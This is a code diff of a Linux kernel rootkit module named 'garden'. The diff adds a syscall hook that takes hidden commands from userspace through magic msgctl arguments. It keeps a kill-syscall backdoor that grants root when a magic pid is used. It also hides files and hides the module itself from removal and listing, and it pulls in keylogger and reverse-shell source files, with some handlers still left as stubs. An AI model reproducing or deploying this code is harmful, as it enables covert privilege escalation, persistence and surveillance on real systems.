@@ -3,23 +3,24 @@
  * @author  Aaron Lichtman
  * @brief   A rootkit. // TODO: Expand description
  */
+#include <asm/unistd.h>
+#include <linux/cred.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/ipc.h>
+#include <linux/jiffies.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/init.h>
-#include <linux/fs.h>
-#include <linux/types.h>
-#include <linux/jiffies.h>
-#include <linux/timer.h>
-#include <linux/threads.h>
-#include <linux/syscalls.h>
-#include <linux/sched.h>
-#include <linux/pid.h>
-#include <linux/cred.h>
-#include <linux/unistd.h>
-#include <asm/unistd.h>
-#include <linux/signal.h>
-#include <net/inet_sock.h>
 #include <linux/net.h>
+#include <linux/pid.h>
+#include <linux/sched.h>
+#include <linux/signal.h>
+#include <linux/syscalls.h>
+#include <linux/threads.h>
+#include <linux/timer.h>
+#include <linux/types.h>
+#include <linux/unistd.h>
+#include <net/inet_sock.h>
 #include "arsenal/keylogger.c"
 #include "arsenal/reverse-shell.c"
 #include "khook/engine.c"
@@ -43,21 +44,31 @@ typedef struct legacy_timer_emu {
 typedef struct timer_list _timer;
 #endif
 
+// TODO: Extract this to an h file to avoid duplication.
+#define GET_ROOT 0
+#define KEYLOGGER_ENABLE 1
+#define KEYLOGGER_DISABLE 2
+#define FILE_HIDE_ADD 3
+#define FILE_HIDE_RM 4
+#define FILE_HIDE_SHOW 5
+#define REVERSE_TCP_SHELL 6
+
+// This action_task struct is what is actually passed to the LKM.
+typedef struct action_task {
+    int func_code;
+    char *file_hide_str;
+} action_task;
+
 /**
  * Global defines and variables.
  */
 
 #define POLLING_INTERVAL 1500
 #define MAGIC_ROOT_NUM 31337
+#define MAX_TASK_SIZE 200
 static _timer polling_timer;
 
-/**
- * Module parameters are made writable by anyone.
- * Any interaction with the rootkit will be through a command like:
- * $ echo "1" > /sys/module/garden/parameters/get_root. This will
- * update the value of the get_root parameter. We can poll this value
- * intermittently and do things when it changes.
- **/
+// Module parameters
 
 static bool block_removal = false;
 module_param(block_removal, bool, 0770);
@@ -78,7 +89,7 @@ MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");
  */
 
 static int get_root(void);
-static void poll_for_commands(unsigned long data);
+static void do_something_on_interval(unsigned long data);
 
 /**
  * Logging Helpers
@@ -86,7 +97,7 @@ static void poll_for_commands(unsigned long data);
  */
 
 void log_info(const char *message) {
-    printk(KERN_EMERG "GARDEN: %s", message);
+    printk(KERN_INFO "GARDEN: %s", message);
 }
 
 void log_error(const char *message) {
@@ -94,23 +105,59 @@ void log_error(const char *message) {
 }
 
 /**
- * Handle communication from userspace command program.
+ * Handler for incoming action_tasks. Frees task memory if it doesn't return.
  */
+int handle_task(action_task *task) {
+    printk(KERN_EMERG "Handling function code: %d\n", task->func_code);
+    switch (task->func_code) {
+        case GET_ROOT:
+            return get_root();
+        case KEYLOGGER_ENABLE:
+            // TODO
+            break;
+        case KEYLOGGER_DISABLE:
+            // TODO
+            break;
+        case FILE_HIDE_ADD:
+            // TODO
+            break;
+        case FILE_HIDE_RM:
+            // TODO
+            break;
+        case FILE_HIDE_SHOW:
+            // TODO: print contents of hidden_file_prefix array
+            break;
+        case REVERSE_TCP_SHELL:
+            // TODO
+            break;
+        default:
+            printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
+            return -1;
+    };
+	return 0;
+}
 
-// KHOOK_EXT(int, inet_ioctl, struct socket *, unsigned int, unsigned long);
-// static int khook_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg) {
-// 	if (cmd == ROOTKIT_CMD && arg == PREP_FOR_NEXT_CMD) {
-// 		// TODO: Set flag so that next time this method is called, things can happen.
-// 		// TODO: Exit.
-// 	}
-//
-// 	// TODO: If flag is set and cmd == ROOTKIT_CMD, read action_task from
-// 	// address that arg contains with copy_from_user.
-//
-// 	// TODO: Then add a large if-else or switch statement to handle all the commands.
-// 	return KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);;
-// }
+/**
+ * Hook for communication with kernel from user program. If the first two arguments
+ * are INT_MAX, then the third argument is a pointer to an action task_ struct.
+ * Copy that from userspace and process it.
+ */
+KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs *);
+static long khook___x64_sys_msgctl(const struct pt_regs *regs) {
+    action_task *task;
+    int error;
 
+    if (regs->di == INT_MAX && regs->si == INT_MAX) {
+        printk(KERN_EMERG "sys_msgctl --Incoming command\n");
+        task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
+        copy_from_user(task, (const void *)regs->dx, MAX_TASK_SIZE);
+        error = handle_task(task);
+        kfree(task);
+        return error;
+    } else {
+        return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
+    }
+}
 
 /**
  * Hide files and directories.
@@ -122,7 +169,7 @@ void log_error(const char *message) {
  */
 static bool should_hide_file(const char *name) {
     if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
-	    printk(KERN_INFO "Hiding: %s\n", name);
+        printk(KERN_INFO "Hiding: %s\n", name);
         return true;
     }
     return false;
@@ -180,20 +227,19 @@ struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *
  * Drops the current user into a root shell.
  */
 static int get_root(void) {
-	printk(KERN_EMERG "One root coming right up.");
-	return commit_creds(prepare_kernel_cred(NULL));
+    struct cred *root_creds;
+    printk(KERN_EMERG "One root coming right up.");
+    root_creds = prepare_kernel_cred(NULL);
+    return commit_creds(root_creds);
 }
-
 
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
 static long khook___x64_sys_kill(const struct pt_regs *regs) {
-        printk("sys_kill -- %s pid %ld sig %ld\n", current->comm, regs->di, regs->si);
-		if (regs->di == MAGIC_ROOT_NUM) {
-			return get_root();
-		}
-        return KHOOK_ORIGIN(__x64_sys_kill, regs);
+    if (regs->di == MAGIC_ROOT_NUM) {
+        return get_root();
+    }
+    return KHOOK_ORIGIN(__x64_sys_kill, regs);
 }
-
 
 /**
  * Timer and Command Polling Functions
@@ -237,20 +283,12 @@ __inline static void timer_cleanup_wrapper(_timer *timer) {
 }
 
 /**
- * Do something on an interval, and then  start a timer to call this
+ * Do something on an interval, and then start a timer to call this
  * function again in the future.
  * NOTE: The data parameter is required in order for this to compile.
  */
-static void poll_for_commands(unsigned long data) {
-    // TODO: Store previous values of variables somewhere.
-    log_info("Polling for commands!\n");
-	// printk(KERN_EMERG "rev_shell_ip: %s", rev_shell_ip);
-	// printk(KERN_EMERG "hidden_file_prefix: %s", hidden_file_prefix);
-	// printk(KERN_EMERG "block_removal: %d", block_removal);
-	// printk(KERN_EMERG "keylogger enabled: %d", keylogger);
-
-    // TODO: Check for change in hidden file hiding
-    // TODO: Check for keylogger enabling
+static void do_something_on_interval(unsigned long data) {
+    // TODO: Exfiltrate data.
     set_timer(&polling_timer);
 }
 
@@ -262,17 +300,17 @@ static int __init rootkit_init(void) {
     khook_init();
 
     printk(KERN_EMERG "Initializing timer...\n");
-    timer_init_wrapper(&polling_timer, poll_for_commands);
+    timer_init_wrapper(&polling_timer, do_something_on_interval);
     set_timer(&polling_timer);
 
-	if (block_removal) {
-		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
-		list_del_init(&__this_module.list);
-		kobject_del(&THIS_MODULE->mkobj.kobj);
-	}
+    if (block_removal) {
+        printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
+        list_del_init(&__this_module.list);
+        kobject_del(&THIS_MODULE->mkobj.kobj);
+    }
 
     // Gotta make the compiler happy.
-    poll_for_commands(0);
+    do_something_on_interval(0);
     return 0;
 }
 
@@ -280,9 +318,9 @@ static int __init rootkit_init(void) {
  * Called when $ rmmod is executed. Cleans up rootkit nicely.
  */
 static void __exit rootkit_exit(void) {
-	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
-	khook_cleanup();
-	timer_cleanup_wrapper(&polling_timer);
+    printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
+    khook_cleanup();
+    timer_cleanup_wrapper(&polling_timer);
 }
 
 module_init(rootkit_init);
